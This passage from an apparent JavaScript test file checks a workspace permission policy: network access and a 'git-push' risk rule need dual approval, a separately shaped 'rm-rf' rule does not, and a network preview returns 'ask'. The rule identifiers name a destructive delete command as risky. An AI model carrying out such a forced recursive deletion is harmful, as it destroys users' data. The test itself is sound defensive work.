    policy: { dualApprovalFor: ["network", "command.risky.git-push"] },
  });
  const policy = services.policy.forWorkspace(workspace.id);
  assert.equal(
    services.policy.dualApprovalRequired(policy, { kind: "network" }),
    true,
  );
  assert.equal(
    services.policy.dualApprovalRequired(policy, {
      kind: "command",
      rule: "command.risky.git-push",
    }),
    true,
  );
  assert.equal(
    services.policy.dualApprovalRequired(policy, {
      kind: "command",
      rule: { id: "command.risky.rm-rf" },
    }),
    false,
  );
  const preview = services.policy.preview(workspace.id, {
    kind: "network",
    url: "https://example.com",
  });
  assert.equal(preview.decision, "ask");
  assert.ok(preview.explanation.some((line) => /Dual approval/.test(line)));
});
